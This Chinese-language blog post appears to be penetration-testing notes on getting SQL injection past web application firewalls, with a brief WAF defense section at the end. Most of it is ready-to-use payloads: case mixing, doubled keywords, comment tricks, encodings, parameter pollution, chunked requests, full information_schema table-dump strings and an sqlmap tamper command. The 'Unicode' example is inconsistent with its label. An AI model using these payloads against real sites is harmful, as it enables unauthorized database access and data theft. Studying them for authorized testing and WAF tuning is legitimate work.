---
title: SQL 注入：WAF 绕过技巧汇总
date: 2024-11-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: SQL 注入：WAF 绕过技巧汇总——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## WAF 怎么拦 SQL 注入

WAF 检测 SQL 注入的方法：

1. **关键词匹配：** `SELECT`、`UNION`、`FROM`、`information_schema`、`sleep` 等
2. **正则匹配：** 检测 SQL 语句模式
3. **语义分析：** 解析 SQL 语法判断是否为攻击
4. **行为分析：** 单 IP 请求频率、payload 相似度

大多数 WAF 依赖 1 和 2——存在穷举绕过空间。

---

## 大小写混写

很多 WAF 的规则是大小写敏感的或只覆盖了某一种写法：

```sql
-- 常规写法（大概率被拦）
UNION SELECT 1,2,3

-- 大小写混写
UnIoN SeLeCt 1,2,3
uNIOn sELECt 1,2,3

-- 单个关键字变形
SeLeCt * FrOm users
```

**例外：** 好的 WAF 会把所有关键字转小写后再匹配，大小写混写可能无效。

---

## 双写绕过

WAF 做了一次性删除（把 `<script>` 删掉但剩下拼在一起又形成 `<script>`）：

```sql
-- WAF 把 SELECT 删掉 → 剩下 SEL + ECT = SELECT
SELSELECTECT * FROM users

-- 嵌套双写
UNIUNIONON SELSELECTECT 1,2,3

-- From
FROFROMM information_schema.tables
```

前提：WAF 不是循环替换而是单次替换。

---

## 注释符变形

```sql
-- 内联注释
SELECT/**/1,2,3
UNION/**/SELECT/**/1,2,3

-- 内联注释加版本号（MySQL 条件注释）
/*!50000SELECT*/ 1,2,3

-- 内联注释加随机字符
SEL/**abc*/ECT 1,2,3
UN/**xyz*/ION SE/**pqr*/LECT 1,2,3

-- 两个连续注释
SELECT/**//**/1,2,3
```

---

## 等价替换

```sql
-- 空格替换：用 + / %0a / %0d / %09(TAB) / /**/ / ()
SELECT%0a1,2,3
UNION(SELECT(1),(2),(3))

-- 字符串连接代替敏感函数名
-- database() → SCHEMA()
SELECT SCHEMA()  -- MySQL 5.0+ 等价 database()

-- and / or 替换
AND → && (URL编码 %26%26)
OR  → || (URL编码 %7c%7c)

-- = 替换
=  → LIKE / REGEXP / BETWEEN ... AND ...
AND 1 LIKE 1
AND 'a' BETWEEN 'a' AND 'a'
```

---

## 编码绕过

```sql
-- URL 双编码
%2531 → 第一次解码 %31 → 第二次解码 '1'

-- Hex 编码
SELECT 0x61646d696e  -- = SELECT 'admin'

-- Char() 函数
SELECT CHAR(97,100,109,105,110)  -- = 'admin'

-- Unicode
SELECT admin
```

---

## HTTP 参数污染 (HPP)

同一参数多次出现，WAF 和后端解析方式不同：

```
?id=1&id=2  -- PHP 取最后一个(2)，WAF 可能检查第一个(1)
```

绕过方式：把攻击 payload 放在第二个参数里。

---

## 分块传输 (Chunked Transfer)

把 HTTP Body 拆成多个 chunk 发送，WAF 做不了完整匹配：

```http
POST /api HTTP/1.1
Transfer-Encoding: chunked

5
id=1 
7
UNION S
5
ELECT
```

需要手工构造或用 burp 插件（chunked-coding-converter）。

---

## 实战绕过案例

```
原始 payload（被拦）：
?id=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -

绕过一：注释+大小写
?id=1'/**/UnIoN/**/SeLeCt/**/1,group_concat(table_name),3/**/FrOm/**/information_schema.tables/**/WhErE/**/table_schema=SCHEMA()/**/--%20-

绕过二：括号+内联
?id=1'/*!UNION*/(SELECT/*!1*/),(SELECT+group_concat(table_name)+FrOm/*!information_schema.tables*/),(3)/*!*/--%20-
```

---

## 工具和技巧

| 工具/插件 | 用途 |
|----------|------|
| SQLMap tamper 脚本 | `--tamper=space2comment,randomcase,charencode` |
| Burp Turbo Intruder | 批量测 WAF 规则漏洞 |
| wafw00f | 识别目标用了什么 WAF |

SQLMap tamper 组合：

```bash
sqlmap -u "..." --tamper=space2comment,randomcase,charencode,versionedmore --dbs
```

---

## 防御（从 WAF 视角）

1. 正则不写太简单——关键词必须覆盖各种变体
2. 解码后再检测——URL 解码、Unicode 解码都在 WAF 层做
3. 行为分析——相似 payload 大量尝试 → 直接封 IP

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
